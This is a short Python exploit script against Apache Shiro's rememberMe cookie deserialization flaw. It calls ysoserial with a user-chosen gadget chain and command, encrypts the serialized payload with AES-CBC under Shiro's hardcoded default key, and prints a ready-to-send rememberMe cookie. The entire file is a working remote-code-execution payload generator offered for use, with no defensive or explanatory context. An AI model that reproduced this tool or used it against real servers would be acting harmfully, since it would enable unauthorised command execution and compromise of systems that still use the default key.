# -*- coding: utf-8 -*-            
# @Author : may11
# @Time : 2024/1/4 11:15
import argparse
import base64
import subprocess
import uuid

from Crypto.Cipher import AES


def get_rememberMe(command):
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = "kPH+bIxk5D2deZiIxcaaaA=="
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(command)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


def com_result():
    parser = argparse.ArgumentParser()
    parser.add_argument('-m', '--module',  required=True)
    parser.add_argument('-c', '--command', required=True)
    args = parser.parse_args()
    module = args.module
    com = args.command
    command_list = ['java', '-jar', 'ysoserial-all.jar', module, com]
    try:
        result = subprocess.run(command_list, stdout=subprocess.PIPE)
        return(result.stdout)
    except subprocess.CalledProcessError:
        print("ysoserial执行异常!")

def main():
    command=com_result()
    remember=get_rememberMe(command)
    print("rememberMe={}".format(remember.decode()))


if __name__ == '__main__':
    main()